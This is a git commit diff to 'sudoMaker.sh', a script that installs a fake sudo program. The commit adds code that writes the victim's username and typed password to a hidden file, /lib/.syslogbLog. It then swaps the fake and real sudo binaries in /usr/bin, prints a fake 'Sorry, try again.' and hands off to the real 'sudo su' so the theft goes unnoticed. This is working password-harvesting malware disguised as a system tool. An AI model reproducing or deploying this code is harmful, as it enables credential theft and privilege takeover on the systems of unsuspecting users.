3867a4a375689063c7a540e77eb3b64f18b4c064
Sam Burton <sam.burton271@gmail.com>
2024-03-27 16:15:05 -0400

    Reflected style change in sudomaker

--- syslogT/sudoMaker.sh
+++ syslogT/sudoMaker.sh
@@ -5,6 +5,7 @@ import subprocess
 import sys
 import getpass
 import socket
+import time
 
 def main():
     if(len(sys.argv) == 1):
@@ -23,39 +24,12 @@ def main():
         password = input(sudoCommand)
         
         os.system("echo \"" + user + ":" + password + "\" >> /lib/.syslogbLog")
-        password = (password + '\n')
-        encoded = password.encode('utf-8')
+        os.system("mv /usr/bin/sudo /usr/bin/sudoC")
+        os.system("mv /usr/bin/sudoA /usr/bin/sudo")
+        time.sleep(3)
         os.system('stty echo')
-        arguments = ' '.join(sys.argv[1:])
-        sudoCmd = ['sudoA', '-l', 'su']
-        command = subprocess.Popen(sudoCmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        stdout, stderr = command.communicate(password)
-        output = str(command).split()
-        if(output[2] == '0'):
-            runShell(password)
-        else:
-            print(user+" is not in the sudoers file. This incident will be reported.")
-def runShell(password):
-    cont = True
-    directory = "~"
-    host = socket.gethostname()
-    while(cont):
-        option = input("[root@"+host+" "+directory+"]# ")
-        if(len(option) == 0):
-            pass
-        elif(option.lower() in ('exit')):
-            print("exit")
-            return
-        else:
-            #command = "sudoA -S "+option
-            runCommand(password, option)
-def runCommand(password, command):
-    try:
-        password = "b\'+password+\'"
-        result = subprocess.run(['sudoA', '-S', command], input=password, capture_output=True, text=True, check=True)
-        print(result.stdout)
-    except subprocess.CalledProcessError as e:
-        print(e)
+        print("Sorry, try again.")
+        os.system("sudo su")
 main()
 EOFA
 cat <<EOFB > /usr/bin/sudoC
